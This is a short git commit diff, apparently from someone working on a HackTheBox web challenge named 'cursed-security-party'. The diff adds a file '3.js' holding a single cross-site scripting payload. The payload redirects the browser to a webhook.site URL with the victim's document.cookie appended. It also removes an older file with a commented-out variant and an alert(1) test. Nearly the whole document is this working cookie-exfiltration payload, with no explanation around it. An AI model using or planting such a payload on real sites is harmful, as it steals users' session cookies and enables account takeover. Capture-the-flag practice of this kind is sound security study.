790f9a94e06f9c80f381f9fcfc0b4d149f099e21
coinrockstar88 <coinrockstar@protonmail.com>
2024-01-04 18:35:42 +0800

    5

---
+++ 3.js
@@ -0,0 +1,1 @@
+document.location='https://webhook.site/ca5af350-7824-4507-9f8c-092eb50cd6bf/leak?c='+document.cookie;
--- htb-chal-web-cursed-security-party.js
+++
@@ -1,2 +0,0 @@
-// document.href='https://webhook.site/ca5af350-7824-4507-9f8c-092eb50cd6bf/leak?c='+document.cookie;
-alert(1);
